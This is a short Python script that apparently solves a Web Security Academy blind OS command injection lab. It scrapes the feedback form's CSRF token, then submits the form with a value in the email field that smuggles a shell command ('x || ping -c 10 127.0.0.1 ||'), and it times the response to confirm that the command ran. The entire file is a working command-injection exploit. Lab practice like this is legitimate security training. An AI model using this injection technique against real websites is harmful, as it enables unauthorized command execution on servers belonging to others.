import requests
import re
import urllib.parse
from bs4 import BeautifulSoup

Host='0ac4002b049980d1835515cc006e0073.web-security-academy.net'
Path='/feedback'

s=requests.Session()

res_get=s.get("https://"+Host+Path)
soup=BeautifulSoup(res_get.text,'html.parser')
csrf_token=soup.find("input",{"name":"csrf"})['value']

payload="x || ping -c 10 127.0.0.1 ||"

data={
    "csrf": csrf_token,
    "name": "test",
    "email": payload,
    "subject": "test",
    "message": "test"
}

Headers={
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded"
}

res=s.post(url="https://"+Host+Path+"/submit",headers=Headers,data=data)

print(res.elapsed.total_seconds())
print(res.status_code)
print(res.text)